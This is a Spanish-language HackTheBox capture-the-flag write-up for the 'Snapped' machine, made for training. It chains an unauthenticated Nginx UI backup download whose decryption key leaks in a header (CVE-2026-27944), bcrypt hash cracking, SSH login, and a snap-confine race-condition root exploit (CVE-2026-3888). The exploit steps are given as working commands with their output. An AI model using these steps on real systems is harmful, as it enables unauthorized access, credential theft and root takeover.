# 🔬 HTB Snapped — Writeup
 
![HackTheBox](https://img.shields.io/badge/Platform-HackTheBox-9fef00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Dificultad](https://img.shields.io/badge/Dificultad-Hard-red?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white)
![Estado](https://img.shields.io/badge/Estado-Pwned-success?style=for-the-badge)
 
> ⚠️ **Aviso legal:** Este writeup es únicamente con fines educativos y fue realizado en un entorno controlado de HackTheBox. Aplicar estas técnicas fuera de entornos autorizados es ilegal.
 
---
 
## 📋 Tabla de contenidos
 
- [Resumen](#-resumen)
- [Reconocimiento](#-reconocimiento)
- [Enumeración Web](#-enumeración-web)
- [CVE-2026-27944 — Backup sin autenticación](#-cve-2026-27944--backup-sin-autenticación)
- [Cracking de hashes bcrypt](#-cracking-de-hashes-bcrypt)
- [Acceso SSH — Flag de usuario](#-acceso-ssh--flag-de-usuario)
- [Escalada de privilegios — CVE-2026-3888](#-escalada-de-privilegios--cve-2026-3888)
- [Conceptos clave](#-conceptos-clave)
- [Cadena de ataque](#-cadena-de-ataque)
---
 
## 🗺 Resumen
 
| Campo      | Detalle                                              |
|------------|------------------------------------------------------|
| Nombre     | Snapped                                              |
| Plataforma | HackTheBox                                           |
| OS         | Linux (Ubuntu 24.04 LTS)                             |
| Dificultad | Hard                                                 |
| User flag  | ✅                                                   |
| Root flag  | ✅                                                   |
| CVEs       | CVE-2026-27944 (Nginx UI backup) · CVE-2026-3888 (snapd LPE) |
 
---
 
## 🔍 Reconocimiento
 
```bash
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.x.x -oG allPorts
nmap -sCV -p22,80 10.129.x.x -oN targeted
```
 
**Puertos relevantes:**
 
| Puerto | Servicio | Detalle                          |
|--------|----------|----------------------------------|
| 22     | SSH      | OpenSSH 9.6p1 Ubuntu             |
| 80     | HTTP     | nginx 1.24.0 → redirect a `snapped.htb` |
 
Añadimos los dominios al `/etc/hosts`:
 
```bash
echo "10.129.x.x snapped.htb admin.snapped.htb" >> /etc/hosts
```
 
---
 
## 🌐 Enumeración Web
 
### Fuzzing de subdominios (Virtual Host)
 
```bash
ffuf -u http://10.129.x.x \
     -H 'Host: FUZZ.snapped.htb' \
     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -ac
```
 
```
admin   [Status: 200, Size: 1407]
```
 
### Identificación de versión de Nginx UI
 
```bash
curl http://admin.snapped.htb/ -s | grep -P '.js\b'
# → ./assets/index-DoHxQupa.js
 
curl http://admin.snapped.htb/assets/index-DoHxQupa.js -s | grep -oP 'version[-\w]*\.js'
# → version-BWPlJ0ga.js
 
curl http://admin.snapped.htb/assets/version-BWPlJ0ga.js
# → const t="2.3.2"
```
 
> **Hallazgo:** Panel **Nginx UI v2.3.2** corriendo en `admin.snapped.htb`
 
### Fuzzing de endpoints API
 
```bash
feroxbuster -u http://admin.snapped.htb/api
```
 
| Endpoint | Estado | Nota |
|---|---|---|
| `/api/install` | 200 | `{"lock":true,"timeout":false}` — ya instalado |
| `/api/backup` | **200** | **¡Devuelve ZIP cifrado sin autenticación!** |
| `/api/licenses` | 200 | JSON de licencias de dependencias |
| `/api/user`, `/api/users`, `/api/sites`, etc. | 403 | Requieren autenticación |
 
> ⚠️ **Hallazgo crítico:** `/api/backup` es accesible sin auth y la clave de descifrado viaja en la propia cabecera HTTP.
 
---
 
## 🔓 CVE-2026-27944 — Backup sin autenticación
 
**Descripción:** Nginx UI expone el endpoint `/api/backup` sin autenticación y filtra la clave AES-256 y el IV en la cabecera `X-Backup-Security`, permitiendo a cualquier atacante descargar y descifrar el backup completo de la aplicación.
 
### Descarga y extracción de la clave
 
```bash
curl http://admin.snapped.htb/api/backup -v -o backup.bin 2>&1 | grep X-Backup-Security
```
 
```
X-Backup-Security: US8nZUXhWdKZ7J1mbE1TProx9oT5H9HzSmaqng5wD0c=:E9sRPUh0wUOolJp7ijmLSg==
```
 
La cabecera expone dos valores Base64 separados por `:`:
 
| Parte | Longitud | Rol |
|---|---|---|
| Primer valor | 32 bytes | Clave AES-256 |
| Segundo valor | 16 bytes | IV (Initialization Vector) |
 
### Descifrado con el PoC
 
```bash
python3 poc.py --target http://admin.snapped.htb/ --decrypt
```
 
```
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting nginx-ui.zip...  → Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...     → Extracted 22 files to backup_extracted/nginx
version: 2.3.2
```
 
### Extracción de hashes desde la base de datos
 
```bash
cd backup_extracted/nginx-ui
sqlite3 database.db
 
sqlite> .headers on
sqlite> select name, password from users;
```
 
| Usuario | Hash bcrypt |
|---|---|
| `admin` | `$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm` |
| `jonathan` | `$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq` |
 
---
 
## 🔑 Cracking de hashes bcrypt
 
```bash
hashcat -m 3200 hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```
 
**Resultado:**
 
| Usuario | Contraseña | Estado |
|---|---|---|
| `jonathan` | `linkinpark` | ✅ Crackeado |
| `admin` | — | ❌ No crackeado |
 
---
 
## 🚩 Acceso SSH — Flag de usuario
 
```bash
# Validación de credenciales
netexec ssh snapped.htb -u jonathan -p linkinpark
# [+] jonathan:linkinpark  Linux - Shell access!
 
# Login
ssh jonathan@snapped.htb
# Password: linkinpark
 
jonathan@snapped:~$ cat user.txt
090aa3c5************************
```
 
---
 
## ⬆️ Escalada de privilegios — CVE-2026-3888
 
### 1. Enumeración del sistema
 
```bash
sudo -l
# Sorry, user jonathan may not run sudo on snapped.
 
id
# uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
 
snap version
# snap    2.63.1+24.04
# snapd   2.63.1+24.04
```
 
Sin sudo, sin grupos especiales. Miramos la configuración de `systemd-tmpfiles`:
 
```bash
cat /usr/lib/tmpfiles.d/tmp.conf
# D /tmp 1777 root root 4m   ← ¡4 minutos! (el default de Ubuntu es 30 días)
```
 
> 🔑 **Observación crítica:** El umbral de limpieza de `/tmp` fue reducido de 30 días a **4 minutos**, haciendo CVE-2026-3888 explotable en minutos.
 
### 2. CVE-2026-3888 — snap-confine / systemd-tmpfiles LPE
 
**Descripción:** Escalada de privilegios local en `snapd` (< 2.73) en todas las versiones LTS de Ubuntu. Permite obtener root explotando una race condition entre `snap-confine` (SUID root) y `systemd-tmpfiles` al recrear `/tmp/.snap`.
 
**Componentes involucrados:**
 
| Componente | Rol |
|---|---|
| `snap-confine` (SUID root) | Configura entornos de ejecución para apps snap |
| `systemd-tmpfiles` | Limpia archivos/dirs temporales según umbral de edad |
 
**Flujo del ataque:**
 
1. `snap-confine` usa `/tmp/.snap/` como área de staging para bind-mounts
2. `systemd-tmpfiles` elimina `/tmp/.snap` al superar el umbral de 4 minutos
3. En el siguiente lanzamiento snap, `snap-confine` lo recrea desde cero
4. El atacante intercambia atómicamente (`rename()`) el directorio legítimo por uno envenenado — tras la validación pero antes del bind-mount
5. `snap-confine` (corriendo como root) bind-monta los archivos del atacante
6. La carga útil reemplaza `ld-linux-x86-64.so.2` — cuando el SUID `snap-confine` lo carga, ejecuta código del atacante como **root**
### 3. Compilación y transferencia del exploit
 
```bash
# Clonar el PoC
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
 
# Compilar variante SUID (Ubuntu 24.04)
gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
 
# Transferir al objetivo
sshpass -p linkinpark scp exploit librootshell.so jonathan@snapped.htb:/tmp/
```
 
### 4. Ejecución
 
```bash
jonathan@snapped:/tmp$ chmod +x exploit librootshell.so
jonathan@snapped:/tmp$ ./exploit librootshell.so
```
 
```
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[Phase 1] Entering Firefox sandbox...     [+] Inner shell PID: 5365
[Phase 2] Waiting for .snap deletion...   [+] .snap deleted.
[Phase 3] Destroying cached namespace...  [+] Namespace destroyed.
[Phase 4] Setting up and running race...
          [!] TRIGGER — swapping directories...
          [+] SWAP DONE — race won!
[Phase 5] Injecting payload...            [+] Payload injected.
[Phase 6] Triggering root via SUID...     [*] Exit status: 0
[Phase 7] Verifying...
          [+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
 
================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================
```
 
> **Nota:** Si el exploit falla en Phase 4 con `permission denied`, es AppArmor interfiriendo. Usa la flag `-s` para saltar la espera y reintentar: `./exploit librootshell.so -s`
 
---
 
## 📚 Conceptos clave
 
### CVE-2026-27944 — Nginx UI backup endpoint sin auth
El endpoint `/api/backup` no requiere token de sesión y filtra la clave AES-256 + IV en la cabecera `X-Backup-Security`. Cualquier actor sin credenciales puede descargar y descifrar el backup completo, obteniendo acceso a la base de datos SQLite con hashes de contraseñas.
 
### CVE-2026-3888 — Race condition en snap-confine
`snap-confine` es un binario SUID que prepara namespaces para las apps snap usando `/tmp/.snap` como área temporal. Cuando `systemd-tmpfiles` limpia ese directorio, `snap-confine` lo recrea sin suficientes garantías atómicas, permitiendo al atacante reemplazar el directorio con uno envenenado. La carga útil sustituye al dynamic linker (`ld-linux-x86-64.so.2`), que al ser cargado por el binario SUID root ejecuta código arbitrario como root.
 
### bcrypt — Por qué el cracking es lento
```
Modo hashcat 3200 = bcrypt $2*$ (Blowfish)
```
bcrypt incorpora un factor de coste (`$2a$10$` → 2^10 = 1024 iteraciones). Esto hace que cada intento sea ~1000x más lento que MD5. Las contraseñas del top de rockyou.txt se craquean; las complejas probablemente no.
 
### systemd-tmpfiles — Parámetro de edad
```bash
# Formato en tmp.conf
D /tmp 1777 root root <EDAD>
 
# Valores
4m   → 4 minutos  (esta máquina — explotable rápidamente)
30d  → 30 días    (Ubuntu stock — espera real en producción)
```
 
### Hashcat — modos más usados
 
| Modo | Hash |
|---|---|
| `-m 0` | MD5 |
| `-m 100` | SHA1 |
| `-m 1800` | SHA-512 (shadow) |
| `-m 3200` | bcrypt |
| `-m 22000` | WPA2 PMKID |
 
---
 
## 🔗 Cadena de ataque
 
```
[Reconocimiento]
nmap → puertos 22, 80
ffuf → subdominio admin.snapped.htb
        │
        ▼
[Nginx UI 2.3.2]
feroxbuster → /api/backup sin auth
CVE-2026-27944: AES key+IV en X-Backup-Security
→ Descifrado del backup → database.db (SQLite)
→ Hash bcrypt de jonathan
        │
        ▼
[hashcat -m 3200]
jonathan : linkinpark
        │
        ▼
[SSH] → user.txt ✅
        │
        ▼
[snapd 2.63.1 + tmpfiles 4m]
CVE-2026-3888: race condition snap-confine (SUID)
→ Poison de ld-linux-x86-64.so.2
→ SUID bash en /var/snap/firefox/common/bash
        │
        ▼
[/var/snap/firefox/common/bash -p] → root ✅
        │
        ▼
[root.txt] ✅
```
 
---
 
## 🛠 Herramientas utilizadas
 
| Herramienta | Uso |
|---|---|
| `nmap` | Reconocimiento de puertos y servicios |
| `ffuf` | Fuzzing de subdominios (Virtual Host) |
| `feroxbuster` | Fuzzing de endpoints API |
| `curl` | Interacción manual con la API |
| `sqlite3` | Inspección de la base de datos del backup |
| `hashcat` (modo 3200) | Cracking de hashes bcrypt |
| `netexec` | Validación de credenciales SSH |
| `gcc` | Compilación del exploit CVE-2026-3888 |
| `sshpass` / `scp` | Transferencia del exploit al objetivo |
 
---
 
*Writeup realizado con fines educativos en HackTheBox.*

